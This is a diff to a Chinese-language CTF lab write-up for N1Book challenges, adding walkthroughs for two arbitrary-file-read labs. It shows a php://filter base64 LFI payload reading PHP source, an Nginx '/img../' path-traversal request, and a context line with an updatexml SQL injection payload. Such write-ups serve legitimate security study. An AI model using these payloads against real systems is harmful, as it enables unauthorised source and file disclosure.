@@ -221,4 +221,70 @@ name=test'and updatexml(1,concat(0x7e,(seselectlect group_concat(column_name) fr
 # 返回信息：string(28) "XPATH syntax error: '~flag~'"
 ```
 
+## 1.3 任意文件读取漏洞
+### 1.3.1 afr_1
+docker-compose.yml
+```
+version: '3.2'
+
+services:
+  web:
+    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest
+    ports:
+      - 80:80
+```
+
+1. 访问本机 ip(172.19.0.1) 进入环境，发现重定向至了 ?p=hello，联想书中"病者多诡(HCTF 2016)"，很有可能类似，猜测存在 include 函数，p 可能是 page。
+   
+2. 使用 wappalyzer 插件获得网站的 Banner 信息，确定是 php。
+   ![wappalyzer](afr_1_wappalyzer.png)
+
+3. 使用 dirsearch 进行目录扫描，发现存在 index.php，且重定向至 ?p=hello
+4. 于是尝试访问 `http://172.19.0.1/index.php`，重定向至了`http://172.19.0.1/?p=hello`，而访问`http://172.19.0.1/?p=index`则是报错。
+   
+5. 尝试使用 php 的 filter 获取 index.php,`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=index`,获得数据`PD9waHAKCmlmKGlzc2V0KCRfR0VUWydwJ10pKSB7CiAgICBpbmNsdWRlIChzdHJpbmcpJF9HRVRbJ3AnXSAuICIucGhwIjsKfQplbHNlewogICAgaGVhZGVyKCdMb2NhdGlvbjogLz9wPWhlbGxvJyk7Cn0=`，解码后得
+  ```
+  <?php
+  if(isset($_GET['p'])) {
+    include (string)$_GET['p'] . ".php";
+  }
+  else{
+    header('Location: /?p=hello');
+  }
+  ```
+
+6. 清楚了逻辑，直接尝试 `flag.php`,即`http://172.19.0.1/?p=php://filter/read=convert.Base64-encode/resource=flag`,获得数据`PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9`，解码得
+  ```
+  <?php
+  die('no no no');
+  //n1book{afr_1_solved}
+  ```
+  明显注释中可能表示 flag，查看官方 write up:`http://172.19.0.1/?p=php://filter/convert.base64-encode/resource=flag`，确定无错。
+
+7. php://协议 Filter解读： `?p=php://filter/read=convert.Base64-encode/resource=flag`
+   - 这是 p 关键字得 get 传递，即p=****
+   - php://是一种协议名称，php://filter/ 是一种访问本地文件的协议
+   - read=convert.Base64-encode 表示文件流编码成 Base64 的形式，这样读取的内容就不会存在 PHP 标签
+   - /resource=flag 表示目标文件是 flag.php
+
+### 1.3.2 afr_2
+docker-compose.yml
+```
+version: '3.2'
+
+services:
+  web:
+    image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest
+    ports:
+      - 80:80
+```
+
+1. 访问环境，使用 wappalyzer 插件获得网站的 Banner 信息,发现服务器使用的 Nginx
+   ![wappalyzer](afr_2_wappalyzer.png)
+2. 使用 dirsearch 进行目录扫描，发现`/img`目录可以直接访问
+   ```
+    301   194B   http://172.19.0.1:80/img    -> REDIRECTS TO: http://172.19.0.1/img/
+    200    99B   http://172.19.0.1:80/index.html
+   ```
+3. 想起 Nginx 错误配置造成的目录穿越漏洞，使用访问路径`/img../`，获得 flag。
 
